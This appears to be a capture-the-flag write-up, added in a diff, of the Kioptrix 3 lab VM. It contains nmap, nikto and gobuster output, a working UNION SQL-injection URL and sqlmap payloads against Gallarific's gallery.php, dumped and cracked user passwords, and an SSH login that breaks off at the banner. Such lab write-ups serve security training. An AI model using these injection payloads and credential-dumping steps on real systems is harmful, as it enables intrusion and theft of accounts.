+<td>Ubuntu 8.04.3 LTS Linux kernel 2.6.24-24 <!-- raw HTML omitted --> dreg:Mast3r <!-- raw HTML omitted --> loneferret:starwars</td>
+<td><a href="https://www.exploit-db.com/exploits/5093">vmsplice&rsquo; Local Privilege Escalation (1) </a> <!-- raw HTML omitted --> <a href="https://www.exploit-db.com/exploits/8556">SCTP FWD Memory Corruption Remote Overflow </a></td>
+<td></td>
+</tr>
+<tr>
+<td>TCP</td>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>TCP</td>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache/2.2.8 (Ubuntu) (EOL) <!-- raw HTML omitted --> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch (outdated) <!-- raw HTML omitted --> HTTP TRACE method is active</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>TCP</td>
+<td>80</td>
+<td><a href="http://kioptrix3.com/phpmyadmin/">http://kioptrix3.com/phpmyadmin/</a></td>
+<td>phpMyAdmin 2.11.3deb1ubuntu1.3 <!-- raw HTML omitted --> 2.11.3.0 (2007-12-08) (outdated)</td>
+<td><a href="https://www.exploit-db.com/exploits/23640">phpMyAdmin 2.x - &lsquo;Export.php&rsquo; File Disclosure</a> <!-- raw HTML omitted --> <a href="https://www.exploit-db.com/exploits/22798">phpMyAdmin 2.x - Information Disclosure</a></td>
+<td></td>
+</tr>
+<tr>
+<td>TCP</td>
+<td>80</td>
+<td><a href="http://kioptrix3.com/">http://kioptrix3.com/</a></td>
+<td>LotusCMS <!-- raw HTML omitted --> <a href="https://github.com/kevinbluett/LotusCMS-Content-Management-System">Only security updates have been provided as of June 2012.</a></td>
+<td><a href="https://www.exploit-db.com/exploits/15964">Lotus CMS Fraise 3.0 - Local File Inclusion / Remote Code Execution</a> <!-- raw HTML omitted --> <a href="https://www.exploit-db.com/exploits/18565">LotusCMS 3.0 - &lsquo;eval()&rsquo; Remote Command Execution (Metasploit)</a></td>
+<td>&lsquo;eval()&rsquo;</td>
+</tr>
+<tr>
+<td>TCP</td>
+<td>80</td>
+<td><a href="http://kioptrix3.com/gallery/">http://kioptrix3.com/gallery/</a></td>
+<td>Gallarific 2.1 - Free Version released October 10, 2009 <!-- raw HTML omitted --> admin:n0t7t1k4</td>
+<td><a href="https://www.exploit-db.com/exploits/8796">Gallarific - &lsquo;user.php&rsquo; Arbirary Change Admin Information</a> <!-- raw HTML omitted --> <a href="https://www.exploit-db.com/exploits/15891">GALLARIFIC PHP Photo Gallery Script - &lsquo;gallery.php&rsquo; SQL Injection</a></td>
+<td>&lsquo;gallery.php&rsquo; SQL Injection <!-- raw HTML omitted --> <a href="http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--">http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--</a></td>
+</tr>
+</tbody>
+</table>
+<h3 id="enum">Enum</h3>
+<h4 id="where-you-at">Where you at</h4>
+<pre><code class="language-txt">nmap -n -sn -PR 192.168.88.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 12:07 CET
+Nmap scan report for 192.168.88.2
+Host is up (0.00019s latency).
+MAC Address: 00:50:56:FE:4E:C1 (VMware)
+Nmap scan report for 192.168.88.131
+Host is up (0.00090s latency).
+MAC Address: 00:0C:29:FF:C3:CB (VMware)
+Nmap scan report for 192.168.88.254
+Host is up (0.00033s latency).
+MAC Address: 00:50:56:F7:8F:D0 (VMware)
+Nmap scan report for 192.168.88.128
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.13 seconds
+</code></pre>
+<h4 id="tcp">TCP</h4>
+<pre><code class="language-txt"># Nmap 7.80 scan initiated Fri Jan  3 12:11:21 2020 as: nmap -p- -A -oA tcp 192.168.88.131
+Nmap scan report for 192.168.88.131
+Host is up (0.00058s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Ligoat Security - Got Goat? Security ...
+MAC Address: 00:0C:29:FF:C3:CB (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.58 ms 192.168.88.131
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jan  3 12:11:32 2020 -- 1 IP address (1 host up) scanned in 12.53 seconds
+</code></pre>
+<h4 id="udp">UDP</h4>
+<pre><code class="language-bash">map -sU -T4 192.168.88.131 -oA udp
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 14:08 CET
+Nmap scan report for kioptrix3.com (192.168.88.131)
+Host is up (0.00063s latency).
+All 1000 scanned ports on kioptrix3.com (192.168.88.131) are closed (955) or open|filtered (45)
+MAC Address: 00:0C:29:FF:C3:CB (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1039.80 seconds
+</code></pre>
+<h4 id="19216888131---80">192.168.88.131 - 80</h4>
+<h5 id="nikto">Nikto</h5>
+<pre><code class="language-bash">nikto -h kioptrix3.com
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.88.131
++ Target Hostname:    kioptrix3.com
++ Target Port:        80
++ Start Time:         2020-01-04 14:09:31 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
++ Cookie PHPSESSID created without the httponly flag
++ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 21:22:00 2009
++ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
++ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 7784 requests: 0 error(s) and 19 item(s) reported on remote host
++ End Time:           2020-01-04 14:09:52 (GMT1) (21 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+<h6 id="gobuster">gobuster</h6>
+<pre><code class="language-bash">~/go/bin/gobuster dir -u http://kioptrix3.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -e -o gobuster_dir_dir-list-med_kioptrix3.com
+
+==============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://kioptrix3.com
+[+] Threads:        40
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Expanded:       true
+[+] Timeout:        10s
+===============================================================
+2020/01/04 14:27:57 Starting gobuster
+===============================================================
+http://kioptrix3.com/modules (Status: 301)
+http://kioptrix3.com/gallery (Status: 301)
+http://kioptrix3.com/data (Status: 403)
+http://kioptrix3.com/core (Status: 301)
+http://kioptrix3.com/style (Status: 301)
+http://kioptrix3.com/cache (Status: 301)
+http://kioptrix3.com/phpmyadmin (Status: 301)
+http://kioptrix3.com/server-status (Status: 403)
+===============================================================
+2020/01/04 14:28:12 Finished
+===============================================================
+</code></pre>
+<h3 id="exploit">exploit</h3>
+<h4 id="phpmyadmin">phpMyAdmin</h4>
+<p>Default creds
+user: admin
+pass:</p>
+<h4 id="gallarific-21-sqli">Gallarific 2.1 SQLi</h4>
+<pre><code>http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--
+
+1:admin:n0t7t1k4
+3
+</code></pre>
+<h6 id="sqlmap">sqlmap</h6>
+<pre><code class="language-bash">sqlmap identified the following injection point(s) with a total of 150 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-6226 OR 6767=6767
+
+    Type: error-based
+    Title: MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(7964,8851)&gt;(SELECT COUNT(*),CONCAT(0x71787a6b71,(SELECT (ELT(7964=7964,1))),0x7171767a71,FLOOR(RAND(0)*2))x FROM (SELECT 7501 UNION SELECT 4753 UNION SELECT 8655 UNION SELECT 9044)a GROUP BY x)
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 1628 FROM (SELECT(SLEEP(5)))jacP)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x71787a6b71,0x67416378756a444d6e4a6868477742664b48597175664f664d4f7a69755a7963735579686c6f5359,0x7171767a71),NULL,NULL,NULL,NULL,NULL-- MpZe
+---
+back-end DBMS: MySQL &gt;= 4.1
+Database: gallery
+Table: dev_accounts
+[2 entries]
++----+---------------------------------------------+------------+
+| id | password                                    | username   |
++----+---------------------------------------------+------------+
+| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
+| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
++----+---------------------------------------------+------------+
+
+Database: gallery
+Table: gallarific_users
+[1 entry]
++--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
+| userid | email   | photo   | website | joincode | lastname | password | username | usertype  | firstname | datejoined | issuperuser |
++--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
+| 1      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;  | User     | n0t7t1k4 | admin    | superuser | Super     | 1302628616 | 1           |
++--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
+
+Database: gallery
+Table: gallarific_settings
+[18 entries]
++-------------+--------------------------------------+----------------+
+| settings_id | settings_name                        | settings_value |
++-------------+--------------------------------------+----------------+
+| 1           | gallarific_version                   | 2.0            |
+| 2           | gallarific_theme                     | black          |
+| 3           | gallarific_gallery_name              | Gallarific     |
+| 7           | gallarific_photos_per_page           | 20             |
+| 8           | gallarific_comments_per_page         | 10             |
+| 9           | gallarific_users_per_page            | 20             |
+| 10          | gallarific_recent_photos             | 4              |
+| 11          | gallarific_popular_photos            | 8              |
+| 12          | gallarific_accept_user_registrations | 1              |
+| 15          | gallarific_comments_enabled          | 1              |
+| 16          | gallarific_auto_approve_comments     | 0              |
+| 17          | gallarific_userimage_width           | 32             |
+| 18          | gallarific_userimage_height          | 32             |
+| 19          | gallarific_medium_width              | 430            |
+| 20          | gallarific_medium_height             | 430            |
+| 21          | gallarific_thumbnail_width           | 150            |
+| 22          | gallarific_thumbnail_height          | 150            |
+| 24          | gallarific_installer_done            | 1              |
++-------------+--------------------------------------+----------------+
+
+Database: gallery
+Table: gallarific_photos
+[3 entries]
++--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+
+| userid | photoid | galleryid | tags    | title                 | views | size   | status | filename       | votecount | votetotal | description                      | dateuploaded |
++--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+
+| 1      | 5       | 1         | &lt;blank&gt; | Photo Shoot           | 19    | 19374  | 1      | 8y1a02r6yh.jpg | 0         | 0         | New picture for new book         | 1302652908   |
+| 1      | 3       | 1         | &lt;blank&gt; | In the know...        | 16    | 16279  | 1      | 8csqlvc375.jpg | 0         | 0         | Self-Explanotory                 | 1302652708   |
+| 1      | 4       | 1         | &lt;blank&gt; | Getting ready for GNN | 15    | 10618  | 1      | 0q52na4t2g.jpg | 1         | 5         | Hours before software's release! | 1302651920   |
++--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+
+
+Database: gallery
+Table: gallarific_galleries
+[1 entry]
++----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+
+| parentid | galleryid | name              | sort | created    | description                                                                                                             |
++----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+
+| 0        | 1         | Ligoat Press Room | 0    | 1302628616 | See how we are doing in the news!  This is a collection of wild pictures, good times and how to make money at its best. |
++----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+
+
+Database: gallery
+Table: gallarific_stats
+[15 entries]
++----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+
+| ID | Var01            | Var02 | Var03                                                                                                                                                                                                | Var04 | Var05 | Var06   | Var07        | Var08   | Var09                | Var10    | Var11                    | Var12                    | Var13                            | Var14                                            | Var15                            | Var16                                                | Var17   | Var18   | Var19                        | Var20                                        | Var21   | Var22   | Var23   |
++----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+
+| 1  | MTMwMjYyODcxOQ== | MTU=  | aHR0cDovL2tpb3B0cml4My5jb20vaW5kZXgucGhw                                                                                                                                                             | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | V2l0aCBUaGFua3MgVG8gfg== | U2l0ZSBMaW5rcyB+         | UGhvdG8gR2FsbGVyeSBTY3JpcHQ=     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS90b3VyLnBocA== | SG9zdCBNdWx0aXBsZSBTaXRlcw==     | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 2  | MTMwMjYyODgwNg== | MTU=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9bnVsbCthbmQrMT0yK3VuaW9uK3NlbGVjdCsxLGdyb3VwX2NvbmNhdCh1c2VyaWQsMHgzYSx1c2VybmFtZSwweDNhLHBhc3N3b3JkKSwzLDQsNSw2Kytmcm9tK2dhbGxhcmlmaWNfdXNlcnMtLQ== | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6     | R3JhY2lvdXMgVGhhbmtzOg== | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | SG9zdCBSZXNlbGxlciBTaXRlcw==     | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 3  | MTMwMjYyODg0OA== | MTQ=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MQ==                                                                                                                                                 | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | VGhhbmtzIFRv             | V2ViIExpbmtz             | UEhQIFBpY3R1cmUgR2FsbGVyeQ==     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | RmFzdCBTZXJ2ZXIgSG9zdA==         | aHR0cDovL3d3dy5zYWNob3N0LmNvbS8=                     | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 4  | MTMwMjYyODg3Mw== | MTU=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9NDg=                                                                                                                                                 | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6     | R3JhY2lvdXMgVGhhbmtzOg== | UGhvdG8gR2FsbGVyeSBTY3JpcHRz     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | TXVsdGlwbGUgRG9tYWluIEhvc3Rpbmc= | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 5  | MTMwMjYyODg4MA== | MjQ=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9NTIyOA==                                                                                                                                             | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6     | R3JhY2lvdXMgVGhhbmtzOg== | R2FsbGVyeSBQaG90byBQSFAgU2NyaXB0 | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | QnV5IFNTTCBDZXJ0aWZpY2F0ZQ==     | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw==         | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 6  | MTMwMjYyODg4OQ== | MjU=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMDk0MjA9MTQ4MQ==                                                                                                                         | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29uZmVycmVkIEJ5IH4=     | TW9yZSBTaXRlcyB+         | UGl4IEdhbGxlcnk=                 | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS9mYXEucGhw     | R2VvVHJ1c3QgU1NMIENlcnRpZmljYXRl | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw==         | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 7  | MTMwMjYyODg5Nw== | MjQ=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMDEyOTY9MTI5Ng==                                                                                                                         | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | QXNzb2NpYXRlZCBXaXRoIC0= | T3RoZXIgTGlua3MgLQ==     | UEhQIFBob3RvcyBTY3JpcHQ=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | RmFudGFzdGljbyBIb3N0             | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 8  | MTMwMjYyODkwNw== | MTM=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMFNMRUVQJTI4NSUyOQ==                                                                                                                     | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJvdmlkZWQgYnkgLS0=     | T3RoZXIgTGlua3MgLS0=     | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | RmFudGFzdGljbyBIb3N0             | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 9  | MTMwMjYzMTM3MA== | MTc=  | aHR0cDovL2tpb3B0cml4My5jb20vcC5waHAvMQ==                                                                                                                                                             | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29uZmVycmVkIEJ5IH4=     | TW9yZSBTaXRlcyB+         | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | UmVzZWxsZXIgQWNjb3VudCBIb3N0     | aHR0cDovL3d3dy5teWN3cy5jb20vaG9zdGluZy9yZXNlbGxlci8= | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 10 | MTMwMjYzNTQ5Nw== | MjU=  | aHR0cDovL2tpb3B0cml4My5jb20vZy5waHAvMQ==                                                                                                                                                             | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6     | R3JhY2lvdXMgVGhhbmtzOg== | R2FsbGFyaWZpYw==                 | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | RmFzdGVyIFdlYiBIb3N0             | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 11 | MTMwMjYzNTUxMA== | MTA=  | aHR0cDovL2tpb3B0cml4My5jb20vcmVjZW50LnBocA==                                                                                                                                                         | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | TWFkZSBQb3NzaWJsZSBCeTo= | VGhhbmtzIFRvOg==         | UGhvdG8gR2FsbGVyeSBTY3JpcHQ=     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS90b3VyLnBocA== | Q2hlYXBlc3QgRG9tYWluIE5hbWVz     | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vY3AvY2hlY2sucGhw | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 12 | MTMwMjYzNTU5MQ== | MjM=  | aHR0cDovL2tpb3B0cml4My5jb20vbG9nb3V0LnBocA==                                                                                                                                                         | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJlc2VudGVkIEJ5IDo6     | TXVjaCBUaGFua3MgOjo=     | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | UmVzZWxsZXIgQWNjb3VudCBIb3N0     | aHR0cDovL3d3dy5teWN3cy5jb20vaG9zdGluZy9yZXNlbGxlci8= | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 13 | MTMwMjYzODQwOA== | MjE=  | aHR0cDovL2tpb3B0cml4My5jb20vcHJvZmlsZS5waHA=                                                                                                                                                         | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJvdmlkZWQgYnkgLS0=     | T3RoZXIgTGlua3MgLS0=     | UGhvdG8gU2hhcmluZyBHYWxsZXJ5     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | SG9zdCBNdWx0aXBsZSBEb21haW5z     | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 14 | MTMwMjY1MTc5Mg== | MjY=  | aHR0cDovL2tpb3B0cml4My5jb20vcC5waHAvMg==                                                                                                                                                             | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | VGhhbmtzIHRvID4=         | QWxzbyA+                 | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | U2FjcmFtZW50byBIb3N0aW5n         | aHR0cDovL3d3dy5zYWNob3N0LmNvbS8=                     | &lt;blank&gt; | &lt;blank&gt; | Q2hlYXAgU1NMIENlcnRpZmljYXRl | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw== | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
+| 15 | MTMwMjY1MjA4NQ== | Nw==  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSZzb3J0PXBob3RvaWQ=                                                                                                                                 | AA==  | MA==  | &lt;blank&gt; | I2JjYmNiYw== | &lt;blank&gt; | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29tcGxpbWVudHMgT2Y6     | QWRkaXRpb25hbCBUaGFua3M6 | UEhQIFBob3RvIFNvZnR3YXJl         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | QnV5IFNTTCBDZXJ0aWZpY2F0ZQ==     | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw==         | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt;                      | &lt;blank&gt;                                      | &lt;blank&gt; | &lt;blank&gt; | &lt;blank&gt; |
++----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+
+
+Database: gallery
+Table: gallarific_comments
+[0 entries]
++---------+
+| comment |
++---------+
++---------+
+</code></pre>
+<h6 id="ssh">SSH</h6>
+<pre><code class="language-bash">ssh loneferret@192.168.88.131
+The authenticity of host '192.168.88.131 (192.168.88.131)' can't be established.
+RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.88.131' (RSA) to the list of known hosts.
+loneferret@192.168.88.131's password:
+Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
